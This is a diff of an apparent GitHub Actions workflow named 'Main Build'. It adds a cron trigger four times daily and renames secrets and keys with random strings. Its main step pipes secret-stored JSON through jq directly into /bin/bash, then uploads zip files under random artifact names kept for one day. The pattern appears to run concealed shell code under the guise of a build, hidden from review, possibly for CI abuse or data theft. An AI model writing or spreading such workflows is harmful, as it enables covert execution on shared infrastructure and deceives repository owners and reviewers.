@@ -2,6 +2,8 @@ name: Main Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '22 0,6,12,18 * * *'
 env:
   CI: true
 jobs:
@@ -13,16 +15,15 @@ jobs:
           fetch-depth: 0
       - name: Main step
         env:
-          kydbw53146: ${{ secrets.kydbw53146 }}
+          bklr08598: ${{ secrets.bklr08598 }}
         run: |
-          printf '%s' "$kydbw53146" | jq -r .nlxv428 | /bin/bash
-          printf '%s' "$hce9256" | jq -r .t463 | /bin/bash
-          echo $yu49 | jq -r .xdeie639 | /bin/bash
-          printf '%s' "$f8" | jq -r .e3 | /bin/bash
+          printf '%s' "$bklr08598" | jq -r .jaltp730 | /bin/bash
+          printf '%s' "$sv2" | jq -r .q870 | /bin/bash
+          echo $gdax2810 | jq -r .vocs2 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
         with:
-          name: Fim8mR7Z
+          name: K1qdswhS
           path: "*.zip"
           retention-days: 1
